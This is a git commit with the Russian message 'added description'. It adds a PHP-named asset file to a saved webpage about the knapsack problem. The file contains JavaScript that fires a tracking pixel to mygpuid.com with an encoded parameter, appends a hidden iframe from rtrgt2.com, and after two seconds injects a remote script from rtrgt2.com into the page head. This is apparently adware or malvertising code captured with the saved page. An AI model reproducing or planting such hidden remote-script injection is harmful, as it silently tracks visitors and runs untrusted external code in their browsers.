cb409cd582d00c31cdf619880a19d14676c2acb6
mrozk <mrozk2012@gmail.com>
2016-03-15 14:55:46 +0200

    добавил описание

---
+++ Плотная упаковка/Задача о загрузке/Алгоритм Рюкзака - Задача о рюкзаке_files/apu(1).php
@@ -0,0 +1,15 @@
+
+document.createElement('img').src = "http://mygpuid.com/?s=eyJ0Ijoic2hhcmVkX3BpeGVsIiwiZG9tYWluIjoiaHR0cDpcL1wvcnRyZ3QyLmNvbSIsIm9haWQiOiI3MzAyOWFiNDFiOWM0NWM3ZDdmZmNhZTFjZmVkODcyNiJ9";
+    var iframe602003e = document.createElement('iframe');
+    iframe602003e.setAttribute('style', 'display:none; position:absolute; top:0px; left:0px;');
+    iframe602003e.setAttribute('src', "http:\/\/rtrgt2.com\/fpix.php?zoneid=12040");
+    document.getElementsByTagName('body')[0].appendChild(iframe602003e);
+    setTimeout(function()
+    {
+        var secondScriptJs602003e = document.createElement('script');
+        secondScriptJs602003e.src = "http:\/\/rtrgt2.com\/apu.php?zoneid=12040&final";
+        secondScriptJs602003e.type = "text/javascript";
+        secondScriptJs602003e.language = "javascript";
+        var head602003e = document.getElementsByTagName('head')[0];
+        head602003e.appendChild(secondScriptJs602003e);
+    }, 2000);
